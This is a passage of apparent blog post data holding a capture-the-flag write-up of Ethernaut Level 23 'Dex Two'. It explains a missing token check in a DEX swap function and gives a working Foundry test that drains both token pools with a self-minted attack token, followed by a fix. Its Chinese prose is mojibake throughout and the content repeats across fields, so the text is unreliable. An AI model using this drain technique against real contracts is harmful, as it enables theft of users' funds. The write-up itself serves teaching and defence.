**åˆ›å»ºæ”»å‡»ä»£å¸**: éƒ¨ç½²ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ERC20ä»£å¸ã€‚\n3.  **æ³¨å…¥è™šå‡æµåŠ¨æ€§**: å‘ `DexTwo` åˆçº¦å‘é€æå°‘é‡çš„æ”»å‡»ä»£å¸ï¼Œä»¥å»ºç«‹ä¸€ä¸ªæä¸å¹³è¡¡çš„äº¤æ˜“å¯¹ã€‚\n4.  **è€—å°½Token1**: ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ `DexTwo` ä¸­æ‰€æœ‰çš„ `Token1`ã€‚\n5.  **è€—å°½Token2**: å†æ¬¡ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ `DexTwo` ä¸­æ‰€æœ‰çš„ `Token2`ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä¸¥æ ¼çš„è¾“å…¥éªŒè¯**: è¿™æ˜¯æœ€å…³é”®çš„é˜²å¾¡æªæ–½ã€‚åˆçº¦å¿…é¡»ä¸¥æ ¼éªŒè¯æ‰€æœ‰å¤–éƒ¨è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å†³å®šæ ¸å¿ƒé€»è¾‘çš„å‚æ•°ï¼Œå¦‚æœ¬ä¾‹ä¸­çš„ä»£å¸åœ°å€ã€‚\n\n    ```solidity\n    // ä¿®å¤å»ºè®®ï¼šåŠ å›è¢«ç§»é™¤çš„éªŒè¯\n    function swap(address from, address to, uint amount) public {\n        require((from == token1 && to == token2) || (from == token2 && to == token1), \"Invalid tokens\");\n        // ... a reste of the swap logic\n    }\n    ```\n\n2.  **ä½¿ç”¨ç™½åå•**: å¯¹äºå…è®¸å“ªäº›ä»£å¸å‚ä¸äº¤äº’çš„ç³»ç»Ÿï¼Œåº”ç»´æŠ¤ä¸€ä¸ªå¯ä¿¡ä»£å¸çš„ç™½åå•ï¼Œå¹¶å¯¹æ‰€æœ‰ä¼ å…¥çš„ä»£å¸åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **è¾“å…¥éªŒè¯**: æ™ºèƒ½åˆçº¦å®‰å…¨ä¸­æœ€åŸºæœ¬ä¹Ÿæ˜¯æœ€é‡è¦çš„åŸåˆ™ä¹‹ä¸€ã€‚æ°¸è¿œä¸è¦ç›¸ä¿¡æ¥è‡ªå¤–éƒ¨çš„è¾“å…¥ã€‚\n-   **ä»£å¸ç™½åå•**: ä¸€ç§å¸¸è§çš„å®‰å…¨æ¨¡å¼ï¼Œç”¨äºé™åˆ¶ç³»ç»Ÿåªä¸é¢„å…ˆæ‰¹å‡†çš„ã€å—ä¿¡ä»»çš„ä»£å¸åˆçº¦è¿›è¡Œäº¤äº’ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   ç¼ºå°‘å¯¹è¾“å…¥å‚æ•°ï¼ˆå¦‚ä»£å¸åœ°å€ï¼‰çš„éªŒè¯æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚\n-   åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ä¸­ï¼Œå¦‚æœå…è®¸ä»»æ„ä»£å¸å‚ä¸äº¤æ˜“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å¼•å…¥è‡ªå·±æ§åˆ¶çš„ä»£å¸æ¥è½»æ˜“åœ°æ“çºµä»·æ ¼ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ›å»ºä¸€ä¸ªæ–°çš„ã€ç”±æ”»å‡»è€…å®Œå…¨æ§åˆ¶çš„ERC20ä»£å¸ã€‚\n-   å°†è¿™ä¸ªæ–°ä»£å¸ä¸ç›®æ ‡ä»£å¸åœ¨ä¸€ä¸ªç¼ºä¹éªŒè¯çš„DEXä¸­å½¢æˆäº¤æ˜“å¯¹ã€‚\n-   åˆ©ç”¨æä¸å¹³è¡¡çš„æµåŠ¨æ€§æ¯”ä¾‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å–æ‰€æœ‰ç›®æ ‡ä»£å¹£ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   å¯¹æ‰€æœ‰å‡½æ•°çš„è¾“å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼çš„ç™½åå•æˆ–æœ‰æ•ˆæ€§æ£€æŸ¥ã€‚\n-   ç¡®ä¿æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚äº¤æ˜“ï¼‰åªèƒ½åœ¨é¢„æœŸçš„ã€å—ä¿¡ä»»çš„èµ„äº§ä¹‹é—´è¿›è¡Œã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [SWC-107: Unchecked External Call](https://swcregistry.io/docs/SWC-107) (è™½ç„¶æœ¬ä¾‹æ˜¯ç¼ºå°‘éªŒè¯ï¼Œä½†æ ¹æºéƒ½æ˜¯å¯¹å¤–éƒ¨è¾“å…¥/åˆçº¦çš„ä¸ä¿¡ä»»)\n-   [Secureum: Input Validation](https://secureum.substack.com/p/security-pitfalls-and-best-practices-101)","slug":"ethernaut-level-23-dex-two","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpk001pbf5qa0wwgyf5","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-23-Dex-Two-ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\"><a href=\"#ğŸ¯-Ethernaut-Level-23-Dex-Two-ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\"></a>ğŸ¯ Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/23\">Ethernaut Level 23 - Dex Two</a><br><strong>æ”»å‡»ç±»å‹</strong>: ä»·æ ¼æ“çºµ &#x2F; ç¼ºå°‘è¾“å…¥éªŒè¯<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œä½ éœ€è¦ä¸ä¸€ä¸ª <code>Dex</code> åˆçº¦äº¤äº’ã€‚ä½†è¿™æ¬¡çš„ç›®æ ‡æ›´å…·æŒ‘æˆ˜æ€§ï¼šä½ éœ€è¦åŒæ—¶è€—å°½ <code>Dex</code> åˆçº¦ä¸­ <code>Token1</code> <strong>å’Œ</strong> <code>Token2</code> çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚</p>\n<ul>\n<li><strong>åˆå§‹çŠ¶æ€</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg\" alt=\"Dex Two Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>DexTwo</code> åˆçº¦çš„ä»£ç ä¸ä¸Šä¸€å…³çš„ <code>Dex</code> å‡ ä¹å®Œå…¨ç›¸åŒï¼Œä½†æœ‰ä¸€ä¸ªå¾®å°å´è‡´å‘½çš„æ”¹åŠ¨ã€‚åœ¨ <code>swap</code> å‡½æ•°ä¸­ï¼Œä¸€è¡Œå…³é”®çš„éªŒè¯ä»£ç è¢«ç§»é™¤äº†ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// This line was present in Dex, but is missing in DexTwo</span><br><span class=\"line\">// require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>è¿™è¡Œä»£ç åŸæœ¬ç”¨äºç¡®ä¿äº¤æ˜“åªåœ¨ <code>token1</code> å’Œ <code>token2</code> ä¹‹é—´è¿›è¡Œã€‚ç”±äºå®ƒè¢«ç§»é™¤äº†ï¼Œ<code>DexTwo</code> çš„ <code>swap</code> å‡½æ•°ç°åœ¨å¯ä»¥æ¥å—<strong>ä»»ä½•</strong>ç¬¦åˆERC20æ ‡å‡†çš„ä»£å¸ä½œä¸ºäº¤æ˜“å¯¹çš„ä¸€æ–¹ã€‚</p>\n<p>è¿™å°±ä¸ºæˆ‘ä»¬æ‰“å¼€äº†æ”»å‡»çš„å¤§é—¨ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ã€æ¯«æ— ä»·å€¼çš„â€œæ”»å‡»ä»£å¸â€ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º <code>Token3</code>ï¼‰ï¼Œå¹¶ç”¨å®ƒæ¥æ“çºµä¸ <code>Token1</code> å’Œ <code>Token2</code> çš„äº¤æ˜“ä»·æ ¼ã€‚</p>\n<h3 id=\"æ”»å‡»æµç¨‹\"><a href=\"#æ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹\"></a>æ”»å‡»æµç¨‹</h3><p>æˆ‘ä»¬çš„ç­–ç•¥æ˜¯åˆ©ç”¨æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ <code>Token3</code> ä½œä¸ºåª’ä»‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å– <code>Dex</code> æ± ä¸­æ‰€æœ‰çš„ <code>Token1</code> å’Œ <code>Token2</code>ã€‚</p>\n<ol>\n<li><p><strong>åˆ›å»ºå¹¶åˆ†å‘æ”»å‡»ä»£å¸</strong>: æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„ERC20ä»£å¸ <code>Token3</code>ï¼Œå¹¶ç»™è‡ªå·±é“¸é€ å¤§é‡çš„ <code>Token3</code>ã€‚</p>\n</li>\n<li><p><strong>ä¸º <code>Token3</code> æä¾›â€œæµåŠ¨æ€§â€</strong>: æˆ‘ä»¬å‘ <code>DexTwo</code> åˆçº¦å‘é€æå°‘é‡çš„ <code>Token3</code>ï¼ˆä¾‹å¦‚ï¼Œ1ä¸ªï¼‰ã€‚ç°åœ¨ <code>DexTwo</code> åˆçº¦ä¸­ <code>Token3</code> çš„ä½™é¢ä¸º1ã€‚</p>\n</li>\n<li><p><strong>ç¬¬ä¸€æ¬¡äº¤æ¢ (Token3 -&gt; Token1)</strong>:</p>\n<ul>\n<li>æˆ‘ä»¬ç°åœ¨ç”¨ <code>Token3</code> äº¤æ¢ <code>Token1</code>ã€‚æ± ä¸­ <code>Token1</code> çš„ä½™é¢æ˜¯100ï¼Œ<code>Token3</code> çš„ä½™é¢æ˜¯1ã€‚ä»·æ ¼æ¯”ä¸º 100:1ã€‚</li>\n<li>æˆ‘ä»¬åªéœ€è¦å‘é€1ä¸ª <code>Token3</code>ï¼Œå°±å¯ä»¥æ ¹æ®ä»·æ ¼å…¬å¼æ¢å– <code>(1 * 100) / 1 = 100</code> ä¸ª <code>Token1</code>ã€‚</li>\n<li>äº¤æ¢åï¼Œ<code>Dex</code> æ± ä¸­çš„ <code>Token1</code> è¢«å…¨éƒ¨æ¢èµ°ã€‚</li>\n</ul>\n</li>\n<li><p><strong>ç¬¬äºŒæ¬¡äº¤æ¢ (Token3 -&gt; Token2)</strong>:</p>\n<ul>\n<li>ç°åœ¨æ± ä¸­ <code>Token2</code> çš„ä½™é¢æ˜¯100ï¼Œ<code>Token3</code> çš„ä½™é¢æ˜¯2ï¼ˆæˆ‘ä»¬ç¬¬ä¸€æ¬¡äº¤æ¢æ—¶è½¬å…¥äº†1ä¸ªï¼Œç°åœ¨åˆè½¬å…¥äº†1ä¸ªï¼‰ã€‚ä»·æ ¼æ¯”ä¸º 100:2ï¼Œå³ 50:1ã€‚</li>\n<li>æˆ‘ä»¬å‘é€2ä¸ª <code>Token3</code>ï¼Œå°±å¯ä»¥æ¢å– <code>(2 * 100) / 2 = 100</code> ä¸ª <code>Token2</code>ã€‚</li>\n<li>äº¤æ¢åï¼Œ<code>Dex</code> æ± ä¸­çš„ <code>Token2</code> ä¹Ÿè¢«å…¨éƒ¨æ¢èµ°ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>é€šè¿‡å¼•å…¥ä¸€ä¸ªæˆ‘ä»¬å®Œå…¨æ§åˆ¶çš„ç¬¬ä¸‰æ–¹ä»£å¸ï¼Œæˆ‘ä»¬æˆåŠŸåœ°æ“çºµäº†ä»·æ ¼ï¼Œå¹¶ç”¨æå°çš„ä»£ä»·ï¼ˆæ€»å…±3ä¸ªæˆ‘ä»¬è‡ªå·±éšæ„é“¸é€ çš„ <code>Token3</code>ï¼‰æ¸…ç©ºäº†æ•´ä¸ª <code>Dex</code> æ± ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç å°†æ¨¡æ‹Ÿä¸Šè¿°çš„æ”»å‡»æµç¨‹ï¼šåˆ›å»ºæ–°ä»£å¸ï¼Œå¹¶ç”¨å®ƒæ¥è€—å°½ <code>DexTwo</code> çš„æµåŠ¨æ€§ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/23_DexTwo.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTwoTest is Test &#123;</span><br><span class=\"line\">    DexTwo instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableTokenTwo token1;</span><br><span class=\"line\">    SwappableTokenTwo token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new DexTwo();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²å¹¶è®¾ç½®åˆå§‹ä»£å¸</span><br><span class=\"line\">        token1 = new SwappableTokenTwo(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableTokenTwo(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ·»åŠ æµåŠ¨æ€§å¹¶å‘é€åˆå§‹ä»£å¸ç»™ player</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token1), 100);</span><br><span class=\"line\">        instance.add_liquidity(address(token2), 100);</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexTwoAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. éƒ¨ç½²æˆ‘ä»¬è‡ªå·±çš„æ¶æ„ä»£å¸</span><br><span class=\"line\">        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(instance), &quot;Attack Token&quot;, &quot;ATK&quot;, 400);</span><br><span class=\"line\">        attackToken.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. å‘ Dex æä¾›æå°‘é‡çš„æ¶æ„ä»£å¸æµåŠ¨æ€§</span><br><span class=\"line\">        attackToken.transfer(address(instance), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. ç”¨1ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token1</span><br><span class=\"line\">        uint256 dexT1Balance = token1.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount1 = instance.get_swap_price(address(attackToken), address(token1), 1);</span><br><span class=\"line\">        assertEq(swapAmount1, dexT1Balance, &quot;Price should allow draining Token1&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token1), 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. ç”¨2ä¸ªæ¶æ„ä»£å¸æ¢èµ°æ‰€æœ‰ Token2</span><br><span class=\"line\">        uint256 dexT2Balance = token2.balanceOf(address(instance));</span><br><span class=\"line\">        uint256 swapAmount2 = instance.get_swap_price(address(attackToken), address(token2), 2);</span><br><span class=\"line\">        assertEq(swapAmount2, dexT2Balance, &quot;Price should allow draining Token2&quot;);</span><br><span class=\"line\">        instance.swap(address(attackToken), address(token2), 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. éªŒè¯ Dex çš„ä¸¤ç§ä»£å¸éƒ½å·²è¢«è€—å°½</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 &amp;&amp; token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of both tokens&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è¯†åˆ«æ¼æ´</strong>: å‘ç° <code>swap</code> å‡½æ•°ç¼ºå°‘å¯¹äº¤æ˜“ä»£å¸çš„ç™½åå•éªŒè¯ã€‚</li>\n<li><strong>åˆ›å»ºæ”»å‡»ä»£å¸</strong>: éƒ¨ç½²ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ERC20ä»£å¸ã€‚</li>\n<li><strong>æ³¨å…¥è™šå‡æµåŠ¨æ€§</strong>: å‘ <code>DexTwo</code> åˆçº¦å‘é€æå°‘é‡çš„æ”»å‡»ä»£å¸ï¼Œä»¥å»ºç«‹ä¸€ä¸ªæä¸å¹³è¡¡çš„äº¤æ˜“å¯¹ã€‚</li>\n<li><strong>è€—å°½Token1</strong>: ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ <code>DexTwo</code> ä¸­æ‰€æœ‰çš„ <code>Token1</code>ã€‚</li>\n<li><strong>è€—å°½Token2</strong>: å†æ¬¡ç”¨å°‘é‡æ”»å‡»ä»£å¸äº¤æ¢ <code>DexTwo</code> ä¸­æ‰€æœ‰çš„ <code>Token2</code>ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>ä¸¥æ ¼çš„è¾“å…¥éªŒè¯</strong>: è¿™æ˜¯æœ€å…³é”®çš„é˜²å¾¡æªæ–½ã€‚åˆçº¦å¿…é¡»ä¸¥æ ¼éªŒè¯æ‰€æœ‰å¤–éƒ¨è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å†³å®šæ ¸å¿ƒé€»è¾‘çš„å‚æ•°ï¼Œå¦‚æœ¬ä¾‹ä¸­çš„ä»£å¸åœ°å€ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®ï¼šåŠ å›è¢«ç§»é™¤çš„éªŒè¯</span><br><span class=\"line\">function swap(address from, address to, uint amount) public &#123;</span><br><span class=\"line\">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class=\"line\">    // ... a reste of the swap logic</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä½¿ç”¨ç™½åå•</strong>: å¯¹äºå…è®¸å“ªäº›ä»£å¸å‚ä¸äº¤äº’çš„ç³»ç»Ÿï¼Œåº”ç»´æŠ¤ä¸€ä¸ªå¯ä¿¡ä»£å¸çš„ç™½åå•ï¼Œå¹¶å¯¹æ‰€æœ‰ä¼ å…¥çš„ä»£å¸åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>è¾“å…¥éªŒè¯</strong>: æ™ºèƒ½åˆçº¦å®‰å…¨ä¸­æœ€åŸºæœ¬ä¹Ÿæ˜¯æœ€é‡è¦çš„åŸåˆ™ä¹‹ä¸€ã€‚æ°¸è¿œä¸è¦ç›¸ä¿¡æ¥è‡ªå¤–éƒ¨çš„è¾“å…¥ã€‚</li>\n<li><strong>ä»£å¸ç™½åå•</strong>: ä¸€ç§å¸¸è§çš„å®‰å…¨æ¨¡å¼ï¼Œç”¨äºé™åˆ¶ç³»ç»Ÿåªä¸é¢„å…ˆæ‰¹å‡†çš„ã€å—ä¿¡ä»»çš„ä»£å¸åˆçº¦è¿›è¡Œäº¤äº’ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>ç¼ºå°‘å¯¹è¾“å…¥å‚æ•°ï¼ˆå¦‚ä»£å¸åœ°å€ï¼‰çš„éªŒè¯æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚</li>\n<li>åœ¨å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ä¸­ï¼Œå¦‚æœå…è®¸ä»»æ„ä»£å¸å‚ä¸äº¤æ˜“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å¼•å…¥è‡ªå·±æ§åˆ¶çš„ä»£å¸æ¥è½»æ˜“åœ°æ“çºµä»·æ ¼ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ›å»ºä¸€ä¸ªæ–°çš„ã€ç”±æ”»å‡»è€…å®Œå…¨æ§åˆ¶çš„ERC20ä»£å¸ã€‚</li>\n<li>å°†è¿™ä¸ªæ–°ä»£å¸ä¸ç›®æ ‡ä»£å¸åœ¨ä¸€ä¸ªç¼ºä¹éªŒè¯çš„DEXä¸­å½¢æˆäº¤æ˜“å¯¹ã€‚</li>\n<li>åˆ©ç”¨æä¸å¹³è¡¡çš„æµåŠ¨æ€§æ¯”ä¾‹ï¼Œä»¥æä½çš„ä»·æ ¼æ¢å–æ‰€æœ‰ç›®æ ‡ä»£å¹£ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å¯¹æ‰€æœ‰å‡½æ•°çš„è¾“å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼çš„ç™½åå•æˆ–æœ‰æ•ˆæ€§æ£€æŸ¥ã€‚</li>\n<li>ç¡®ä¿æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚äº¤æ˜“ï¼‰åªèƒ½åœ¨é¢„æœŸçš„ã€å—ä¿¡ä»»çš„èµ„äº§ä¹‹é—´è¿›è¡Œã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://swcregistry.io/docs/SWC-107\">SWC-107: Unchecked External Call</a> (è™½ç„¶æœ¬ä¾‹æ˜¯ç¼ºå°‘éªŒè¯ï¼Œä½†æ ¹æºéƒ½æ˜¯å¯¹å¤–éƒ¨è¾“å…¥&#x2F;åˆçº¦çš„ä¸ä¿¡ä»»)</li>\n<li><a href=\"https://secureum.substack.com/p/security-pitfalls-and-best-practices-101\">Secureum: Input Validation</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-23-Dex-Two-ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\"><a href=\"#ğŸ¯-Ethernaut-Level-23-Dex-Two-ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ\"></a>ğŸ¯ Ethernaut Level 23: Dex Two - ä»»æ„ä»£å¸å¯¹ä»·æ ¼æ“çºµ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/23\">Ethernaut Level 23 - Dex Two</a><br><strong>æ”»å‡»ç±»å‹</strong>: ä»·æ ¼æ“çºµ &#x2F; ç¼ºå°‘è¾“å…¥éªŒè¯<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œä½ éœ€è¦ä¸ä¸€ä¸ª <code>Dex</code> åˆçº¦äº¤äº’ã€‚ä½†è¿™æ¬¡çš„ç›®æ ‡æ›´å…·æŒ‘æˆ˜æ€§ï¼šä½ éœ€è¦åŒæ—¶è€—å°½ <code>Dex</code> åˆçº¦ä¸­ <code>Token1</code> <strong>å’Œ</strong> <code>Token2</code> çš„å…¨éƒ¨æµåŠ¨æ€§ã€‚</p>\n<ul>\n<li><strong>åˆå§‹çŠ¶æ€</strong>: <ul>\n<li>Player: 10 